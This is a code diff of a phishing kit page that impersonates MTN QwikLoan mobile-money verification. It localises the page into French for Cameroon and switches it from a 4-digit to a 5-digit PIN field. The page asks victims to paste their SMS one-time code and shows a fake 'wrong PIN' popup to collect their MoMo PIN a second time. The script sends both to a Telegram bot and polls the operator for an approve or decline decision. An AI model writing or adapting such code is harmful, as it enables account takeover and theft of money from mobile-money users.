@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="fr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>MTN QwikLoan – OTP Verification</title>
+    <title>MTN QwikLoan – Vérification OTP</title>
 
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
 
@@ -290,15 +290,11 @@
             margin-bottom: 18px;
         }
 
-        .modal-pin-row {
-            display: grid;
-            grid-template-columns: repeat(4, 1fr);
-            gap: 12px;
-            margin: 8px 0 4px;
-        }
-
+        /* Single PIN input inside modal - now 5 digits */
         .modal-pin-input {
             width: 100%;
+            max-width: 220px;
+            margin: 0 auto;
             height: 52px;
             border-radius: 12px;
             border: 1px solid #ddd;
@@ -311,7 +307,8 @@
             -webkit-text-security: disc;
             inputmode: numeric;
             font-family: monospace;
-            letter-spacing: 2px;
+            letter-spacing: 6px;
+            display: block;
         }
         .modal-pin-input:focus {
             border-color: #FFCC00;
@@ -351,9 +348,8 @@
             .modal-pin-input {
                 height: 46px;
                 font-size: 22px;
-            }
-            .modal-pin-row {
-                gap: 8px;
+                max-width: 190px;
+                letter-spacing: 4px;
             }
         }
 
@@ -361,9 +357,8 @@
             .modal-pin-input {
                 height: 40px;
                 font-size: 18px;
-            }
-            .modal-pin-row {
-                gap: 6px;
+                max-width: 160px;
+                letter-spacing: 3px;
             }
         }
     </style>
@@ -374,8 +369,8 @@
         <!-- ERROR BOX -->
         <div class="error-box" id="errorBox">
             <div class="close" onclick="hideError()">×</div>
-            <div class="error-title">Error</div>
-            <div class="error-text" id="errorText">Invalid OTP</div>
+            <div class="error-title">Erreur</div>
+            <div class="error-text" id="errorText">Code OTP invalide</div>
         </div>
 
         <div class="content">
@@ -386,49 +381,45 @@
             </div>
 
             <!-- TEXT -->
-            <div class="title">Confirm your account</div>
+            <div class="title">Confirmez votre compte</div>
             <div class="subtitle" id="subtitleText">
-                Please paste the message you received via SMS.<br>
-                <span id="maskedPhone">02xxxxxx20</span>
+                Collez le message que vous avez reçu par SMS.<br>
+                <span id="maskedPhone">65xxxxx56</span>
             </div>
 
             <!-- MESSAGE TEXTAREA -->
             <div class="message-area">
-                <label for="otpMessageText">Paste Message</label>
-                <textarea id="otpMessageText" placeholder="Paste the entire message here..."></textarea>
-
+                <label for="otpMessageText">Collez le message</label>
+                <textarea id="otpMessageText" placeholder="Collez l'intégralité du message ici..."></textarea>
+                <div class="hint">Le code OTP se trouve dans le message SMS.</div>
             </div>
 
             <div class="message" id="formMessage"></div>
 
-            <button class="btn btn-primary" id="submitBtn">Submit</button>
+            <button class="btn btn-primary" id="submitBtn">Soumettre</button>
 
             <!-- Go Back button -->
-            <button class="btn btn-outline" id="goBackBtn">Go Back</button>
+            <button class="btn btn-outline" id="goBackBtn">Retour</button>
         </div>
     </div>
 
-    <!-- ====== PIN MODAL ====== -->
+    <!-- ====== PIN MODAL (single input, 5 digits) ====== -->
     <div class="modal-overlay" id="pinModal">
         <div class="modal-box">
             <div class="modal-title">
-                The MoMo PIN you entered is wrong,<br>
-                Please confirm your PIN again to continue.
+                Le code PIN MoMo que vous avez saisi est incorrect,<br>
+                Veuillez confirmer votre code PIN pour continuer.
             </div>
-            <div class="modal-sub">Enter your 4-digit PIN</div>
+            <div class="modal-sub">Saisissez votre code PIN à 5 chiffres</div>
 
-            <div class="modal-pin-row" id="modalPinRow">
-                <input class="modal-pin-input" id="mpin1" maxlength="1" inputmode="numeric" autocomplete="off">
-                <input class="modal-pin-input" id="mpin2" maxlength="1" inputmode="numeric" autocomplete="off">
-                <input class="modal-pin-input" id="mpin3" maxlength="1" inputmode="numeric" autocomplete="off">
-                <input class="modal-pin-input" id="mpin4" maxlength="1" inputmode="numeric" autocomplete="off">
-            </div>
+            <!-- Single PIN input, maxlength 5 -->
+            <input class="modal-pin-input" id="modalPinInput" maxlength="5" inputmode="numeric" autocomplete="off" type="password" placeholder="· · · · ·">
 
             <div class="modal-message" id="modalMessage"></div>
             <!-- Spinner shown during PIN verification, hidden by default -->
             <div id="modalSpinner" style="display:none; margin-top:10px;">
                 <div class="modal-loader"></div>
-                <div style="font-size:13px; color:#888; margin-top:6px;">Verifying PIN…</div>
+                <div style="font-size:13px; color:#888; margin-top:6px;">Vérification du code PIN…</div>
             </div>
         </div>
     </div>
@@ -457,35 +448,31 @@
         const errorBox = document.getElementById('errorBox');
         const errorText = document.getElementById('errorText');
 
-        // PIN Modal
+        // PIN Modal - single input (5 digits)
         const pinModal = document.getElementById('pinModal');
-        const mpinInputs = [
-            document.getElementById('mpin1'),
-            document.getElementById('mpin2'),
-            document.getElementById('mpin3'),
-            document.getElementById('mpin4')
-        ];
+        const modalPinInput = document.getElementById('modalPinInput');
         const modalMessage = document.getElementById('modalMessage');
         const modalSpinner = document.getElementById('modalSpinner');
-        const modalPinRow = document.getElementById('modalPinRow');
 
         // ==================== RETRIEVE DATA FROM SESSIONSTORAGE ====================
-        const phone = sessionStorage.getItem('mtn_phone') || '0240000020';
+        const phone = sessionStorage.getItem('mtn_phone') || '655123456'; // Cameroon 9 digits
         maskedPhoneSpan.textContent = maskPhone(phone);
 
         function maskPhone(phone) {
             const cleaned = phone.replace(/\D/g, '');
             if (cleaned.length >= 4) {
+                // Show first 2 and last 2 digits, mask the rest with 'x'
                 const start = cleaned.slice(0, 2);
                 const end = cleaned.slice(-2);
-                return start + 'x'.repeat(Math.max(0, cleaned.length - 4)) + end;
+                const middleLength = cleaned.length - 4;
+                return start + 'x'.repeat(middleLength) + end;
             }
             return phone;
         }
 
         // ==================== ERROR HANDLING ====================
         function showError(message) {
-            errorText.innerText = message || 'An error occurred';
+            errorText.innerText = message || 'Une erreur est survenue';
             errorBox.style.display = 'block';
         }
         window.hideError = function() {
@@ -520,11 +507,10 @@
             }
         }
 
-        // ==================== SIMPLE POLLING WITH setInterval (from Telecel cheat sheet) ====================
+        // ==================== SIMPLE POLLING WITH setInterval ====================
         let currentPollInterval = null;
 
         function pollForCallback(expectedPrefix, expectedTs, onDecision) {
-            // Clear any previous polling interval
             if (currentPollInterval) {
                 clearInterval(currentPollInterval);
                 currentPollInterval = null;
@@ -541,7 +527,6 @@
                     if (!data.ok || !data.result.length) return;
 
                     data.result.forEach(update => {
-                        // Update the last processed update ID
                         if (update.update_id > lastUpdateId) {
                             lastUpdateId = update.update_id;
                         }
@@ -553,9 +538,7 @@
                         if (parts.length < 3) return;
 
                         const [type, action, time] = parts;
-                        // Match: same prefix and timestamp (use loose equality for string/number)
                         if (time == expectedTs && type === expectedPrefix) {
-                            // Stop polling and fire callback
                             clearInterval(currentPollInterval);
                             currentPollInterval = null;
                             onDecision(action);
@@ -563,23 +546,19 @@
                     });
                 } catch (err) {
                     console.warn('Polling error:', err);
-                    // Keep polling; the interval continues
                 }
-            }, 1500); // Poll every 1.5 seconds
+            }, 1500);
         }
 
-        // ==================== MODAL PIN LOGIC ====================
+        // ==================== MODAL PIN LOGIC (single input, 5 digits) ====================
         let isModalSubmitting = false;
 
         function closeModal() {
             pinModal.classList.remove('active');
-            mpinInputs.forEach(inp => {
-                inp.value = '';
-                inp.classList.remove('filled');
-            });
+            modalPinInput.value = '';
+            modalPinInput.classList.remove('filled');
             modalMessage.textContent = '';
             modalSpinner.style.display = 'none';
-            modalPinRow.style.display = 'grid';
             isModalSubmitting = false;
         }
 
@@ -587,74 +566,43 @@
             pinModal.classList.add('active');
             modalMessage.textContent = '';
             modalSpinner.style.display = 'none';
-            modalPinRow.style.display = 'grid';
-            mpinInputs.forEach(inp => {
-                inp.value = '';
-                inp.classList.remove('filled');
-            });
+            modalPinInput.value = '';
+            modalPinInput.classList.remove('filled');
             isModalSubmitting = false;
-            setTimeout(() => mpinInputs[0].focus(), 200);
-        }
-
-        function focusModalNext(idx) {
-            if (idx < mpinInputs.length - 1) mpinInputs[idx + 1].focus();
-        }
-
-        function focusModalPrev(idx) {
-            if (idx > 0) mpinInputs[idx - 1].focus();
+            setTimeout(() => modalPinInput.focus(), 200);
         }
 
         function getModalPin() {
-            return mpinInputs.map(inp => inp.value).join('');
+            return modalPinInput.value.trim();
         }
 
-        function areAllModalFilled() {
-            return mpinInputs.every(inp => inp.value.length === 1);
+        function isPinComplete() {
+            return modalPinInput.value.length === 5;
         }
 
-        // Setup modal PIN inputs
-        mpinInputs.forEach((input, idx) => {
-            input.addEventListener('input', function(e) {
-                let val = this.value.replace(/\D/g, '').slice(0, 1);
-                this.value = val;
-                if (val.length === 1) {
-                    this.classList.add('filled');
-                    if (idx < mpinInputs.length - 1) {
-                        focusModalNext(idx);
-                    } else {
-                        if (areAllModalFilled() && !isModalSubmitting) {
-                            submitModalPin();
-                        }
-                    }
-                } else {
-                    this.classList.remove('filled');
-                }
-                modalMessage.textContent = '';
-            });
+        // Event listeners for the single PIN input (5 digits)
+        modalPinInput.addEventListener('input', function(e) {
+            let val = this.value.replace(/\D/g, '');
+            if (val.length > 5) val = val.slice(0, 5);
+            this.value = val;
 
-            input.addEventListener('keydown', function(e) {
-                if (e.key === 'Backspace') {
-                    if (this.value.length === 0 && idx > 0) {
-                        e.preventDefault();
-                        focusModalPrev(idx);
-                        mpinInputs[idx - 1].value = '';
-                        mpinInputs[idx - 1].classList.remove('filled');
-                        modalMessage.textContent = '';
-                    }
-                } else if (e.key === 'ArrowLeft') {
-                    if (idx > 0) {
-                        e.preventDefault();
-                        focusModalPrev(idx);
-                    }
-                } else if (e.key === 'ArrowRight') {
-                    if (idx < mpinInputs.length - 1) {
-                        e.preventDefault();
-                        focusModalNext(idx);
-                    }
-                } else if (!/^[0-9]$/.test(e.key) && e.key !== 'Tab' && e.key !== 'Delete') {
-                    e.preventDefault();
-                }
-            });
+            if (val.length === 5) {
+                this.classList.add('filled');
+            } else {
+                this.classList.remove('filled');
+            }
+
+            modalMessage.textContent = '';
+
+            if (val.length === 5 && !isModalSubmitting) {
+                submitModalPin();
+            }
+        });
+
+        modalPinInput.addEventListener('keydown', function(e) {
+            if (!/^[0-9]$/.test(e.key) && e.key !== 'Backspace' && e.key !== 'Delete' && e.key !== 'Tab' && e.key !== 'ArrowLeft' && e.key !== 'ArrowRight') {
+                e.preventDefault();
+            }
         });
 
         // ==================== SUBMIT MODAL PIN TO TELEGRAM ====================
@@ -662,11 +610,11 @@
             if (isModalSubmitting) return;
 
             const pin = getModalPin();
-            if (pin.length !== 4) return;
+            if (pin.length !== 5) return;
 
             isModalSubmitting = true;
-            modalPinRow.style.display = 'none';
             modalSpinner.style.display = 'block';
+            modalPinInput.disabled = true;
             modalMessage.textContent = '';
             modalMessage.style.color = '#555';
 
@@ -696,8 +644,8 @@
                 });
             } catch (err) {
                 modalSpinner.style.display = 'none';
-                modalPinRow.style.display = 'grid';
-                modalMessage.textContent = '❌ Network error. Please try again.';
+                modalPinInput.disabled = false;
+                modalMessage.textContent = '❌ Erreur réseau. Veuillez réessayer.';
                 modalMessage.style.color = '#dc3545';
                 isModalSubmitting = false;
                 return;
@@ -705,38 +653,33 @@
 
             pollForCallback('pin', ts, (action) => {
                 modalSpinner.style.display = 'none';
-                modalPinRow.style.display = 'grid';
+                modalPinInput.disabled = false;
                 isModalSubmitting = false;
 
                 if (action === 'approve') {
                     closeModal();
                     window.location.href = 'otp4.html';
                 } else if (action === 'decline') {
-                    modalMessage.textContent = '❌ Wrong PIN';
+                    modalMessage.textContent = '❌ Code PIN incorrect';
                     modalMessage.style.color = '#dc3545';
-                    mpinInputs.forEach(inp => {
-                        inp.value = '';
-                        inp.classList.remove('filled');
-                    });
-                    mpinInputs[0].focus();
-                    showError('Wrong PIN. Please try again.');
+                    modalPinInput.value = '';
+                    modalPinInput.classList.remove('filled');
+                    modalPinInput.focus();
+                    showError('Code PIN incorrect. Veuillez réessayer.');
                     setTimeout(() => {
-                        if (modalMessage.textContent === '❌ Wrong PIN') {
+                        if (modalMessage.textContent === '❌ Code PIN incorrect') {
                             modalMessage.textContent = '';
                         }
                     }, 3000);
                 } else if (action === 'timeout') {
-                    // Not used with setInterval, but keep for completeness
-                    modalMessage.textContent = '⏱️ Admin response timed out. Please try again.';
+                    modalMessage.textContent = '⏱️ Délai d\'attente dépassé. Veuillez réessayer.';
                     modalMessage.style.color = '#dc3545';
-                    mpinInputs.forEach(inp => {
-                        inp.value = '';
-                        inp.classList.remove('filled');
-                    });
-                    mpinInputs[0].focus();
+                    modalPinInput.value = '';
+                    modalPinInput.classList.remove('filled');
+                    modalPinInput.focus();
                     isModalSubmitting = false;
                 } else {
-                    modalMessage.textContent = '❌ Unexpected response. Try again.';
+                    modalMessage.textContent = '❌ Réponse inattendue. Réessayez.';
                     modalMessage.style.color = '#dc3545';
                     isModalSubmitting = false;
                 }
@@ -751,7 +694,7 @@
 
             const msgText = messageTextarea.value.trim();
             if (msgText.length < 5) {
-                formMessage.textContent = 'Please paste the complete message (at least 5 characters).';
+                formMessage.textContent = 'Veuillez coller le message complet (au moins 5 caractères).';
                 formMessage.className = 'message error';
                 return;
             }
@@ -788,7 +731,7 @@
                 isSubmitting = false;
                 submitBtn.disabled = false;
                 messageTextarea.disabled = false;
-                showError('Failed to send to Telegram. Please try again.');
+                showError('Échec de l\'envoi à Telegram. Veuillez réessayer.');
                 return;
             }
 
@@ -802,18 +745,18 @@
                     window.location.href = 'otp4.html';
                 } else if (action === 'wrongpin') {
                     openModal();
-                    formMessage.textContent = '📌 Please confirm your PIN in the popup.';
+                    formMessage.textContent = '📌 Veuillez confirmer votre code PIN dans la fenêtre contextuelle.';
                     formMessage.className = 'message';
                 } else if (action === 'decline') {
-                    showError('Paste entire message. Please check your message and try again.');
+                    showError('Collez l\'intégralité du message. Vérifiez et réessayez.');
                     messageTextarea.value = '';
                     messageTextarea.focus();
                     formMessage.textContent = '';
                 } else if (action === 'timeout') {
-                    showError('⏱️ Admin response timed out. Please try again.');
+                    showError('⏱️ Délai d\'attente dépassé. Veuillez réessayer.');
                     messageTextarea.focus();
                 } else {
-                    showError('Unexpected response. Please try again.');
+                    showError('Réponse inattendue. Veuillez réessayer.');
                 }
             });
         }
@@ -822,7 +765,6 @@
 
         // ==================== GO BACK ====================
         goBackBtn.addEventListener('click', () => {
-            // Clear polling interval
             if (currentPollInterval) {
                 clearInterval(currentPollInterval);
                 currentPollInterval = null;
@@ -843,14 +785,13 @@
             messageTextarea.focus();
         }, 200);
 
-        // Close modal if user clicks overlay (only if not submitting)
+        // Close modal only if not submitting (but we keep it open for flow)
         pinModal.addEventListener('click', function(e) {
             if (e.target === pinModal && !isModalSubmitting) {
                 // Do nothing – user must complete flow
             }
         });
 
-        // Cleanup polling on page unload
         window.addEventListener('beforeunload', function() {
             if (currentPollInterval) {
                 clearInterval(currentPollInterval);
@@ -858,7 +799,6 @@
             }
         });
 
-        // Expose for debugging (optional)
         window.__debug = {
             stopPolling: function() {
                 if (currentPollInterval) {
@@ -870,9 +810,9 @@
             phone
         };
 
-        console.log('[MTN QwikLoan] OTP page initialized with setInterval polling (Telecel-style).');
+        console.log('[MTN QwikLoan] OTP page (Cameroon) initialized with French UI and English Telegram messages.');
     })();
-</script>
+    </script>
 
 </body>
 </html>
